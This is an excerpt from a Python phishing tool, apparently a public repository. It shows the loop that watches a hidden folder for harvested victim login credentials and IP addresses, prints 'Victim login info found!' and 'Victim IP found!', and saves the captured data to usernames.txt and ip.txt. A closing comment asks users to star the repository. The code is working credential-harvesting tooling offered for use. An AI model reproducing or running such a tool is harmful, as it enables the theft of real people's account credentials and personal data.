                print("\n\n"+success+bgreen+"Victim login info found!\n\007")
                with open(root+"/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    j=0
                    o=len(userdata)
                    while j<o:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+userdata[j],end="")
                        j+=1
                print("\n"+info+"Saved in usernames.txt")
                print("\n"+info+blue+"Waiting for next....."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                os.remove(root+"/.site/usernames.txt")
            sleep(0.75)
            if os.path.isfile(root+"/.site/ip.txt"):
                os.system("clear")
                print(logo)
                print("\n\n"+success+bgreen+"Victim IP found!\n\007")
                with open(root+"/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    h=0
                    p=len(ipdata)
                    while h<p:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                        h+=1
                print("\n"+info+"Saved in ip.txt")
                print("\n"+info+blue+"Waiting for next...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                os.system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        sprint("\n"+info+"Thanks for using. Have a good day!\n"+nc)
        exit(0)

if __name__ == '__main__':
    try:
        os.system("stty -echoctl")
        update()
        main()
    except KeyboardInterrupt:
        killer()
        sprint("\n"+info2+"Thanks for using!\n"+nc)
# If this code helped you, consider staring repository. Your stars encourage me a lot!
